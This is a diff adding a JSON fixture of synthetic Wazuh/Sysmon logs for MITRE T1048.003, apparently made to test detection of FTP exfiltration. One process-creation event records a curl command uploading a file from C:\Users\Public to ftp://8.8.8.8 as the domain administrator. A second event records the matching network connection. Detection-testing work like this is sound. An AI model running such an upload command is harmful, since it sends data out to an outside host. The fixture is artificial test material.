@@ -1,0 +1,155 @@
+{
+  "_metadata": {
+    "attack_id": "T1048.003",
+    "variation": "001",
+    "name": "Exfiltration Over Alternative Protocol - FTP",
+    "description": "Exfiltrate data using FTP protocol via curl",
+    "expected_detection": "MEDIUM",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Process Creation: curl FTP upload",
+      "sequence": 1,
+      "timestamp": "2026-02-09T10:52:00.000Z",
+      "log": {
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1048.003"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Alternative Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1709000111.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-09 10:52:00.000",
+              "processGuid": "{12345678-1234-1234-1234-000000111001}",
+              "processId": "14128",
+              "image": "C:\\Windows\\System32\\curl.exe",
+              "commandLine": "curl  -T C:\\Users\\Public\\test_exfil.txt ftp://8.8.8.8/upload",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4",
+              "parentProcessGuid": "{12345678-1234-1234-1234-000000111000}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - Network Connection: FTP to 8.8.8.8:21",
+      "sequence": 2,
+      "timestamp": "2026-02-09T10:52:01.000Z",
+      "log": {
+        "rule": {
+          "level": 8,
+          "description": "Sysmon - Event 3: Network connection",
+          "id": "100103",
+          "mitre": {
+            "id": [
+              "T1048.003"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Alternative Protocol"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1709000111.000002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-09 10:52:01.000",
+              "processGuid": "{12345678-1234-1234-1234-000000111001}",
+              "processId": "14128",
+              "image": "C:\\Windows\\System32\\curl.exe",
+              "user": "CORP\\Administrator",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIp": "198.51.100.10",
+              "sourcePort": "49512",
+              "destinationIp": "8.8.8.8",
+              "destinationPort": "21",
+              "destinationPortName": "ftp"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
